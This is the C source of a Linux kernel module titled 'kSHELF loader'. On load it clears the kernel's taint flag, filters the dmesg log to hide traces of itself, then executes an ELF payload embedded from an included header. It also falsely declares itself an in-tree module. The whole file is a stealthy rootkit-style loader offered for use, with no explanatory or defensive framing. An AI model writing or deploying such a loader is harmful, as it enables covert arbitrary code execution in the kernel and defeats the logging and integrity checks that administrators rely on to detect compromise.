#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>

#include "include/shelf.h"
#include "include/util.h"
#include "include/untaint.h"
#include "include/filter_dmesg.h"

#include "/workdir/artifacts/payload.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("bah");
MODULE_DESCRIPTION("kSHELF loader");
MODULE_VERSION("1.0");
MODULE_INFO(intree, "true");

/* Module parameters */
static unsigned long int taint_value = 0;
module_param(taint_value, long, 0);
MODULE_PARM_DESC(taint_value, "Taint Value");


static int mod_init(void)
{
    printk(KERN_INFO "Loading\n");
    /* Cleaning up artifacts */
    untaint_kernel(taint_value);
    filter_dmesg();

    run_elf(payload, payload_len);

    return 0;
}

static void mod_exit(void) {
    printk(KERN_INFO "Unloading\n");
}


module_init(mod_init);
module_exit(mod_exit);
